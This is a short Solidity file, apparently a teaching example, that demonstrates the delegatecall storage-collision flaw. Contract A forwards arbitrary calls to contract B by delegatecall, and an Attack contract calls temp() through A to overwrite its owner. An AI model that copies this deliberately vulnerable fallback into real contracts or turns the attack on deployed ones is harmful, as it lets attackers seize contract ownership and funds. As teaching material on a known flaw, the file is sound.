// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Delegate call
// run your code inside my context which means if we specify some state variables in contract A
// and the specify the same order in contract B  {check for only those state variables for which we are concerned}
// and after this , if we make a deligatecall from A -> B
// then we can change the state of A using the state variables of B

contract A {
    address public owner;
    B public otherContract;

    constructor(B _otherContract) public {
        owner = msg.sender;
        otherContract = B(_otherContract);
    }

    fallback() external {
        address(otherContract).delegatecall(msg.data);
    }
}

contract B {
    address public owner;

    function temp() public {
        owner = msg.sender;
    }
}

contract Attack {
    address public hackMe;

    constructor(address _hackMe) public {
        hackMe = _hackMe;
    }

    function attack() public {
        hackMe.call(abi.encodeWithSignature("temp()"));
    }
}
